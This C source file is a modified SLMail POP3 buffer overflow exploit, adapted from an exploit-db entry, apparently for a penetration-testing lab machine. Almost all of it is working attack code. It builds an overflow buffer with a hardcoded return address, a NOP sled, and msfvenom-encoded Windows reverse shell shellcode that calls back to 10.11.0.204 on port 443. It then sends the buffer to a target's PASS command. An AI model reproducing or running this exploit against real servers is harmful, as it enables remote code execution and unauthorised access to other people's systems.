/* 643-fixed.c
 *
 * This is a modified version of exploit 643.c from the exploit-db,
 * copyright and credit remains with the original author.
 *
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

/**
 * Add missing libraries
 *
 */
#include <arpa/inet.h>  // Fix implicit declaration ‘inet_addr’
#include <unistd.h>     // Fix implicit declaration ‘read’, 'write', 'close'
 
#define retadd "\x8F\x35\x4A\x5F" /* Win Se7en PWK lab machine */
#define port 110

/**
 * reverse shell
 * 
 * msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.204 LPORT=443 \
 * EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 * 
 */
unsigned char shellcode[] =
"\xd9\xc6\xbf\x53\x88\xbf\x9d\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x7a\x17\x83\xea\xfc\x03\x29\x9b\x5d\x68\x31\x73\x23"
"\x93\xc9\x84\x44\x1d\x2c\xb5\x44\x79\x25\xe6\x74\x09\x6b\x0b"
"\xfe\x5f\x9f\x98\x72\x48\x90\x29\x38\xae\x9f\xaa\x11\x92\xbe"
"\x28\x68\xc7\x60\x10\xa3\x1a\x61\x55\xde\xd7\x33\x0e\x94\x4a"
"\xa3\x3b\xe0\x56\x48\x77\xe4\xde\xad\xc0\x07\xce\x60\x5a\x5e"
"\xd0\x83\x8f\xea\x59\x9b\xcc\xd7\x10\x10\x26\xa3\xa2\xf0\x76"
"\x4c\x08\x3d\xb7\xbf\x50\x7a\x70\x20\x27\x72\x82\xdd\x30\x41"
"\xf8\x39\xb4\x51\x5a\xc9\x6e\xbd\x5a\x1e\xe8\x36\x50\xeb\x7e"
"\x10\x75\xea\x53\x2b\x81\x67\x52\xfb\x03\x33\x71\xdf\x48\xe7"
"\x18\x46\x35\x46\x24\x98\x96\x37\x80\xd3\x3b\x23\xb9\xbe\x53"
"\x80\xf0\x40\xa4\x8e\x83\x33\x96\x11\x38\xdb\x9a\xda\xe6\x1c"
"\xdc\xf0\x5f\xb2\x23\xfb\x9f\x9b\xe7\xaf\xcf\xb3\xce\xcf\x9b"
"\x43\xee\x05\x0b\x13\x40\xf6\xec\xc3\x20\xa6\x84\x09\xaf\x99"
"\xb5\x32\x65\xb2\x5c\xc9\xee\xb7\xab\xd1\x22\xaf\xa9\xd1\xbb"
"\x8b\x27\x37\xd1\xfb\x61\xe0\x4e\x65\x28\x7a\xee\x6a\xe6\x07"
"\x30\xe0\x05\xf8\xff\x01\x63\xea\x68\xe2\x3e\x50\x3e\xfd\x94"
"\xfc\xdc\x6c\x73\xfc\xab\x8c\x2c\xab\xfc\x63\x25\x39\x11\xdd"
"\x9f\x5f\xe8\xbb\xd8\xdb\x37\x78\xe6\xe2\xba\xc4\xcc\xf4\x02"
"\xc4\x48\xa0\xda\x93\x06\x1e\x9d\x4d\xe9\xc8\x77\x21\xa3\x9c"
"\x0e\x09\x74\xda\x0e\x44\x02\x02\xbe\x31\x53\x3d\x0f\xd6\x53"
"\x46\x6d\x46\x9b\x9d\x35\x66\x7e\x37\x40\x0f\x27\xd2\xe9\x52"
"\xd8\x09\x2d\x6b\x5b\xbb\xce\x88\x43\xce\xcb\xd5\xc3\x23\xa6"
"\x46\xa6\x43\x15\x66\xe3";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.6.114");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
